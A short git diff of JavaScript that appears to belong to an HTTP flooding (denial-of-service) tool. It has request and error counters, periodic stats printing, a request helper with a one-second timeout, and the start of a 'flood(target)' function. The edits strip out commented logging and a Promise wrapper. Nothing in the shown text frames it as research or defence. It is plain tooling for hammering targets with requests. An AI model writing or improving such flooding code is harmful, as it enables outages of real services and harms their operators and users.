@@ -6,15 +6,11 @@ let success = 0;
 
   function printStats() {
       console.log(`Log :: ${success} : ${errors}`);
-    // let log = Object.entries(targets).map(([target, { number_of_requests, number_of_errored_responses  }]) => target + ' : ' + number_of_requests + ' : ' + number_of_errored_responses + '\n').join('')
-    // console.log(log);
 }
 
   setInterval(printStats, 10000);
   
   async function fetchWithTimeout(resource) {
-    
-    return new Promise((resolve, reject) => {
         request
         .get(resource, {timeout: 1000})
         .on('response', function(response) {
@@ -23,8 +19,6 @@ let success = 0;
         .on('error', function(err) {
             errors++;
         })
-    })
-    
   }
   
   async function flood(target) {
